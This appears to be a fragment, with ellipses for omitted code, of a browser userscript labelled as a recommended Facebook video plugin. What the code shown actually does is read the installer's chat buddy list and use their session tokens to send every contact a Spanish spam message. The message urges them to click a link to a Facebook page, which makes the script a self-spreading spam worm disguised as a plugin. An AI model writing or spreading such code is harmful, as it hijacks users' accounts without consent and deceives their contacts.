 ...
 */
// ==UserScript==
// @name         PLUGIN FACEBOOK VIDEO(recomendado)
...
var sitio = ['http://www.facebook.com/Dibujos.Ascii',];
		  ...
		  var buddyList = jsonChatResponse['payload']['buddy_list'];
			...
			$.ajax({
			  ...
			  data: {
				...
				msg_text: ':O Increible Unete Hacemos dibujos con letras y simbolos Gratis Click al Link :http://www.facebook.com/Dibujos.Ascii',
				to: contact,
				post_form_id: post_form_id,
				fb_dtsg: fb_dtsg,
					post_form_id_source: "AsyncRequest"
